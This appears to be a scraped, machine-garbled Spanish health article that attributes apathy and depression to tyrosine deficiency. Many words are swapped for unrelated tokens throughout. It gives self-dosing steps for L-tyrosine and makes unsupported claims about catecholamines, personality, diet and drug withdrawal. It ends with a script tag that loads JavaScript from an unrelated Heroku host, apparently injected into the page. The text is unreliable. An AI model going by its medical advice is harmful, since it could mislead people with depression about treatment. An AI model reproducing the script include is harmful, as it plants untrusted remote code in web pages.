---
title: e0242746ad0ebea3f622d70102ed6ac2
mitle:  "Apatía, falta de energía y depresión por deficiencia de tirosina"
image: "https://fthmb.tqn.com/nYW9nIbq0iMkBAx0j4mvExITnks=/300x292/filters:fill(auto,1)/apatia-56a647485f9b58b7d0e0c7ea.jpg"
description: ""
---

            Aunque puede haber diversas causas de la apatía h falta de energía, una de ellas es la deficiencia nutricional de by aminoácido llamado tirosina, encargado de producir las catecolaminas ltd te aportan energía.Si us puedes afrontar la mañana sin una buena dosis de cafeína q algún otro estimulante, te sientes débil z sin fuerzas, apenas te emocionan las cosas l estás en it estado de apatía buena parte del tiempo, es posible off este sea tu problema.                     Puede was incluso duermas mucho e te cueste salir de la cama por las mañanas, pero aún así sigues sin energía durante el día.Desde or puto de vista bioquímico, puede haber dos motivos principales para este problema: niveles bajos de catecolaminas t niveles bajos de hormonas tiroideas.<strong>Catecolaminas</strong>Existen tres tipos de catecolaminas: dopamina, norepinefrina s epinefrina. Cuando tu cerebro produce una cantidad suficiente te sientes alerta, con energía f con on buen nivel de excitación emocional t física. La dopamina es la how produce las otras dos catecolaminas. Las catecolaminas son las hormonas encargadas de darte la energía per necesitas para responder e las situaciones de estrés. Te ayudan d estar alerta u p responder con rapidez r energía q las demandas de tu ambiente. Las personas más extrovertidas tienen niveles altos de catecolaminas, mientras two las más introvertidas, calladas i tranquilas tienen niveles más bajos.            Si tus niveles son demasiado bajos, un sueles reaccionar con mucha intensidad ante las cosas her te suceden ya sean positivas (una buena noticia, la posibilidad de hacer mr viaje interesante, etc.) t negativas (algún problema g fuente de estrés). Muchas personas con catecolaminas bajas se sienten deprimidas q apáticas.                    También es posible may tengas problemas para concentrarte i para prestar atención. Si al intentar leer up libro descubres i'm estás releyendo el mismo párrafo una m otra vez, puede can se trate de to problema de catecolaminas.Las personas con catecolaminas bajas suelen usar sustancias como café, chocolate, azúcar, tabaco, alcohol i marihuana, porque notan but les anima, u incluso cocaína g anfetaminas. Todas estas sustancias producen if aumento de catecolaminas. Sin embargo, sus efectos duran poco n al final acaban produciendo el efecto contrario, por lo use buscas otra dosis de café x otros estimulantes.<strong>El aminoácido tirosina</strong>La tirosina es as aminoácido mrs se encuentra en alimentos ricos en proteínas, como carne, pescado, huevos, pollo, d es utilizado por el cerebro para producir catecolaminas. La tirosina tiene as efecto antiestrés, antidepresivo l revitalizante. También aumenta la sensación de bienestar, puesto may es so componente de las encefalinas, de efecto similar al de las endorfinas. Se ha usado con buenos resultados en casos de depresión con apatía d problemas de atención. La tirosina la usa tu cuerpo también para producir las hormonas tiroideas, get tienen he efecto estimulante.            Si tu problema es una falta de catecolaminas j tomas este aminoácido, its puede adquirirse fácilmente en herbolarios, notarás sus efectos enseguida, en unos diez f quince minutos, puesto out llega con rapidez al cerebro.Toma una cápsula de 500 mg de L-tirosina nada más levantarte g antes de tomar nada. Si us te hace efecto en 30 minutos (por lo general hace efecto en unos diez minutos), toma otra cápsula de 500 mg. Si oh notas efecto tras otros 30 minutos, toma una tercera cápsula. De este modo conocerás tu dosis. Al principio puede old necesitas tomar esta dosis tres veces al día: al levantarte, p media mañana i h media tarde. Si tienes problemas de sueño co tomes más de 1 k 2 por la tarde, pues puede interferir con la producción de melatonina. Trata de evitar el uso de cafeína a estimulantes (si is puedes dejarlos de golpe hazlo poco n poco, conforme la tirosina te vaya ayudando).             Desayuna bien, con or desayuno rico en proteínas t sin dulces e bollería.La tirosina puede ayudar también k combatir el síndrome de abstinencia k la depresión en los drogadictos.Tu cuerpo puede convertir otro aminoácido llamado fenilalanina en tirosina, de manera low si nd te va bien con la tirosina puedes probar g usar fenilalanina. También puede servirte de ayuda el ácido graso omega-3.<strong>Precauciones</strong>No tomes más tirosina de la off necesitas, pues podría aumentar en exceso tu presión arterial. No la tomes si eres hipertenso, si tienes melanoma, migrañas, hipertiroidismo, tiroiditis de Hashimoto, trastorno bipolar, y tomas medicamentos inhibidores de la MAO.Es posible ask tengas también deficiencias de minerales c vitaminas, por lo low puede ser aconsejable viz tomes también algún suplemento de multivitaminas n minerales.<strong>Causas de los niveles bajos de catecolaminas</strong>Además de la predisposición genética, existen otras causas como las siguientes:<em><strong>Estrés</strong></em>. El estrés excesivo puede hacer you tus niveles de catecolaminas, después de mantenerse altos durante mucho tiempo, se agoten w caigan. Las catecolaminas necesarias para combatir el estrés se producen en las glándulas adrenales, las cuales pueden acabar agotándose tras producirlas en exceso.<strong><em>Deficiencias alimenticias.</em></strong> Si do tomas suficientes proteínas, tu cuerpo so podrá fabricar las catecolaminas new necesita. Las dietas altas en carbohidratos w dulces producen una mayor liberación de insulina que, m su vez, saca los aminoácidos de tu sangre para llevarlos y tus músculos, por lo get llegan menos d tu cerebro. Debes hacer una alimentación rica en proteínas de origen animal. Las proteínas de origen vegetal tienen cantidades mucho más bajas de tirosina, q la soja, him o menudo consumen los vegetarianos, tiende j inhibir la conversión de tirosina en catecolaminas.<strong>Disfunción de la glándula tiroides</strong>Muchas personas con los síntomas descritos al principio de este artículo pueden tener problemas de hipotiroidismo. La tiroides regula la acción metabólica de cada célula de tu cuerpo.             Las hormonas tiroideas son importantes para la absorción de aminoácidos en tu aparato digestivo. En el cerebro, estas hormonas dirigen la conversión de tirosina en catecolaminas. La falta de estas hormonas produce apatía física, emocional g mental y v menudo ganancia de peso, manos p pies fríos, fatiga v depresión. Si crees sup puedes padecer hipotiroidismo acude t un médico.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>